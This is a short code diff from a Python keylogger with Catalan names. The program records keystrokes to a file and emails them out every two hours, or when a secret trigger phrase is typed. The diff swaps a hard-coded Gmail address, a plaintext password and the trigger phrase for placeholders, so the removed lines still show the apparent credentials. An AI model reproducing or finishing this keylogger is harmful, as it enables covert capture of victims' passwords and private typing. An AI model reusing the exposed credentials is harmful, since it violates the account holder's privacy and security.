@@ -14,9 +14,9 @@ import time
 
 FREQ_ENVIAMENT = 7200  # (2 hores)
 FREQ_SALT = 300  # (5 mins)
-NOM_FITXER = "pulsacions_enregistrades.txt"
-CORREU = "jamesssmith879@gmail.com"
-CONTRASENYA = "x86NAmAU"
+NOM_FITXER = "..."
+CORREU = "..."
+CONTRASENYA = "..."
 
 
 def escriure(fitxer, text):
@@ -51,7 +51,7 @@ class Keylogger:
                 tecla = " "
         self.text += tecla
         # "clau" per exportar manualment
-        if "ny9a8tor" in self.text:
+        if "..." in self.text:
             self.enviar()
 
     def executar(self):
